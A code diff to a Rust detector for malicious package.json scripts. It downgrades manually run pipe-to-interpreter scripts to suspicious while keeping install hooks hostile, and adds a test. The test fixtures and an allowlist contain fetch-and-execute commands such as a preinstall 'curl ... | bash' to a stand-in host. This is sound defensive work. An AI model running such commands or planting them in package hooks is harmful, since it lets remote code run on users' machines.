@@ -771,7 +771,9 @@ impl PackageJsonAnalyzer {
                 );
             }
 
-            // Check for piping to interpreter (very suspicious)
+            // A package can document an opt-in installer or pipe local data to
+            // a tool. Preserve visibility for manual scripts without treating
+            // their presence as an automatically executed dropper.
             let normalized = script.trim();
             let known_installer = normalized == "curl https://tinybird.co | sh"
                 || (normalized.contains("https://rustwasm.github.io/wasm-pack/installer/init.sh")
@@ -782,23 +784,34 @@ impl PackageJsonAnalyzer {
                 || script.contains("| python"))
                 && !known_installer
             {
-                report.add_finding(
-                    Finding::indicator(
-                        "command-and-control/dropper/pipe-execute".to_string(),
-                        format!("Script '{}' pipes content to interpreter", name),
-                        0.95,
-                    )
-                    .with_criticality(Criticality::Hostile)
-                    .with_attack("T1059")
-                    .with_evidence(vec![Evidence {
-                        method: "pattern".to_string(),
-                        source: "package.json".to_string(),
-                        value: truncate_str(script, 200).to_string(),
-                        location: json_entry_offset(content, "scripts", name)
-                            .map(|o| format!("offset:{o}")),
-                        ..Default::default()
-                    }]),
-                );
+                let finding = Finding::indicator(
+                    "command-and-control/dropper/pipe-execute".to_string(),
+                    format!("Script '{}' pipes content to interpreter", name),
+                    0.95,
+                )
+                .with_criticality(if is_publish_or_install_lifecycle_script(name) {
+                    Criticality::Hostile
+                } else {
+                    Criticality::Suspicious
+                })
+                .with_attack("T1059")
+                .with_evidence(vec![Evidence {
+                    method: "pattern".to_string(),
+                    source: "package.json".to_string(),
+                    value: truncate_str(script, 200).to_string(),
+                    location: json_entry_offset(content, "scripts", name)
+                        .map(|o| format!("offset:{o}")),
+                    ..Default::default()
+                }]);
+                // Findings are deduplicated by ID. A manual script must not
+                // mask a later automatic hook in the same manifest.
+                if let Some(existing) = report.findings.iter_mut().find(|f| f.id == finding.id) {
+                    if finding.crit > existing.crit {
+                        *existing = finding;
+                    }
+                } else {
+                    report.add_finding(finding);
+                }
             }
 
             // Hidden file references are suspicious in install/publish lifecycle hooks,
@@ -1758,6 +1771,32 @@ mod tests {
         ] {
             assert!(report.findings.iter().any(|f| f.id == id), "missing {id}");
         }
+    }
+
+    #[test]
+    fn manual_pipe_does_not_mask_automatic_pipe() {
+        let analyzer = PackageJsonAnalyzer::new();
+        let manual = r#"{"name":"sample","version":"1.0.0","scripts":{
+            "aaa":"curl https://example.test/installer | sh"
+        }}"#;
+        let mixed = r#"{"name":"sample","version":"1.0.0","scripts":{
+            "aaa":"curl https://example.test/installer | sh",
+            "preinstall":"curl https://example.test/payload | bash"
+        }}"#;
+        let find = |content| {
+            let report = analyzer
+                .analyze_package(Path::new("package.json"), content)
+                .unwrap();
+            report
+                .findings
+                .into_iter()
+                .find(|f| f.id == "command-and-control/dropper/pipe-execute")
+                .unwrap()
+        };
+        assert_eq!(find(manual).crit, Criticality::Suspicious);
+        let automatic = find(mixed);
+        assert_eq!(automatic.crit, Criticality::Hostile);
+        assert!(automatic.desc.contains("preinstall"));
     }
 
     #[test]
